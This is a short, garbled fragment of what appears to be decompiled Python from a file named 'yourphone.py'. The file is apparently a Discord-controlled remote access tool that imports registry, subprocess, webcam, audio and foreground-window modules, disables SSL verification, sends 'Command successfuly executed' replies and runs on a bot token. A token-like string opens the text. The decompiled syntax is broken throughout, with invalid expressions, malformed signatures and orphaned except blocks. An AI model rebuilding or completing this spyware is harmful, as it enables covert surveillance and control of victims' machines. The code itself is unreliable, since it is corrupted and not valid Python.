                                            <mask_0>.ODk0MTY3ODU1MjIwNzkzMzc0.YVmEtQ.VI1XHUw_mU1O5tMrotrkkY0N35w('_Selector__preGet', None, (f'{None}' := (f'{None}' := (f'{None}' := (f'{None}' := (f'{None}' := (f'{None}' := (f'{None}' := (f'{None}' if f'{None}' if f'{None}' if f'{None}' is not None))))))
                                        else:  # inserted
                                            if not (446, 447, 448, 449, 440):
                                                def AudioUtilities(commands, *, *: <Code38 code object uncritproc at 0x73a68e52fe50, file yourphone.py>, line 173, utils: <mask_18>, command_prefix: <Code38 code object on_message at 0x73a68e52d590, file yourphone.py>, line 177, winreg: <mask_20>, ctypes: CLSCTX_ALL, sys: CLSCTX_ALL, os: CLSCTX_ALL, ssl: CLSCTX_ALL, random: CLSCTX_ALL, threading: CLSCTX_ALL, time: CLSCTX_ALL, cv2: CLSCTX_ALL, subprocess: CLSCTX_ALL, discord: CLSCTX_ALL, comtypes: CLSCTX_ALL, pycaw.pycaw: CLSCTX_ALL, discord.ext: CLSCTX_ALL, asyncio: CLSCTX_ALL, token: CLSCTX_ALL, getenv: CLSCTX_ALL, appdata: CLSCTX_ALL, Client: CLSCTX_ALL, client: CLSCTX_ALL, Bot: CLSCTX_ALL, bot: CLSCTX_ALL, _create_unverified_context: CLSCTX_ALL, _create_default_https_context: CLSCTX_ALL,helpmenu: CLSCTX_ALL, event: CLSCTX_ALL, run: CLSCTX_ALL, <module>: CLSCTX_ALL, <mask_56>: CLSCTX_ALL, Visiting: : CLSCTX_ALL, <mask_58>: CLSCTX_ALL, <mask_59>:CLSCTX_ALL, <mask_60>:CLSCTX_ALL, win32gui: CLSCTX_ALL, stop_threads:CLSCTX_ALL, GetWindowText:CLSCTX_ALL, GetForegroundWindow: CLSCTX_ALL, Game: CLSCTX_ALL, change_presence:
                                                    pass  # postinserted
                                        except:
                                            except:
                                                pass  # postinserted
                                        await message.channel.send('[*] Command successfuly executed')
                                    else:  # inserted
                                        await message.channel.send('[*] This command requires admin privileges')
client.run(token)